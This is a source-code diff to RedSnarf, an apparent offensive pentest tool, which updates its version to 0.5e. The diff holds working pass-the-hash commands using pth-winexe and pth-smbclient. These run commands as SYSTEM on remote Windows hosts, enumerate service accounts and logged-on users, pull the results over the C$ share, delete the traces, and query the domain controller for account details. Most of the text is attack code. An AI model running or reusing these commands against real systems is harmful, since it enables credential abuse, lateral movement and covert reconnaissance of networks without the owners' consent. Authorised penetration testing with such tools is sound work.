@@ -1011,7 +1011,7 @@ def datadump(user, passw, host, path, os_version):
 			if os.stat(path+host+"/lsadump").st_size >0:
 				fo=open(path+host+"/lsadump","r").read()
 				if "_SC_" in fo:
-					print colored("[+]Checking for services running as users: "+host,'yellow')
+					print colored("[+]Checking for services running as users: "+host+"\n",'yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
@@ -1021,11 +1021,12 @@ def datadump(user, passw, host, path, os_version):
 							u = open(path+host+"/users.txt").read().splitlines()
 							for n in u:
 								if n:
-									print "\t"+n
+									print colored("[+]Account Retrieved ",'yellow')+n								
+
 						except IOError as e:
 							print "I/O error({0}): {1}".format(e.errno, e.strerror)
 
-			print colored("[+]Checking for logged on users: "+host,'yellow')
+			print colored("\n[+]Checking for logged on users: "+host,'yellow')
 			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C query user > c:\\logged_on_users.txt \" 2>/dev/null")
 			os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get logged_on_users.txt\' 2>/dev/null")
 			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\logged_on_users.txt\" 2>/dev/null")
@@ -1045,7 +1046,7 @@ def datadump(user, passw, host, path, os_version):
 
 			#TODO - This can probably be removed given the above check.
 			if service_accounts in yesanswers:
-				print colored("[+]Checking for services running as users: "+host,'yellow')
+				print colored("\n[+]Checking for services running as users: "+host+"\n",'yellow')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
 				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
@@ -1055,7 +1056,18 @@ def datadump(user, passw, host, path, os_version):
 						u = open(path+host+"/users.txt").read().splitlines()
 						for n in u:
 							if n:
-								print "\t"+n
+								print colored("[+]Account Retrieved "+n,'yellow')
+								
+								#Get usernames and query domain for memberships
+								print colored("[+]Attempting to get account details "+n,'green')
+																	
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								stdout_value = proc.communicate()[0]
+								
+								if "User name" in stdout_value:
+									print stdout_value
+								else:
+									print "[-]Unable to retrieve account details from DC"
 					except IOError as e:
 						print "I/O error({0}): {1}".format(e.errno, e.strerror)
 				else:
@@ -2146,7 +2158,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5d", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5e", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
